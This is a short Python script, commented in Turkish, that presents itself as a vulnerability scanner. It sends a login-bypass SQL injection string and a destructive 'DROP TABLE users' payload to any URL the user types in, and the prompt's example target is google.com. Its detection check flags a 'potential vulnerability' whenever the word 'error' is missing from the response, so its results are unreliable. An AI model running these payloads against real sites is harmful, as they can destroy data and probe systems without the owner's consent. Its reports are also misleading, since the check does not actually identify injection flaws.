import requests

def scan_vulnerabilities(url):
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    for payload in payloads:
        # URL'ye eklenmeden önce payload'ları URL'ye düzgün bir şekilde ekleyelim
        full_url = f"{url}?input={payload}"  # Örnek bir query parametresi
        try:
            response = requests.get(full_url)
            if "error" not in response.text:
                print(f"Potansiyel zafiyet bulundu: {full_url}")
        except requests.exceptions.RequestException as e:
            print(f"Hata oluştu: {e}")

if __name__ == "__main__":
    target_url = input("Taramak istediğiniz URL'yi girin (örneğin, https://google.com): ")
    # Eğer kullanıcı şemayı belirtmediyse, varsayılan olarak http ekleyelim
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    scan_vulnerabilities(target_url)
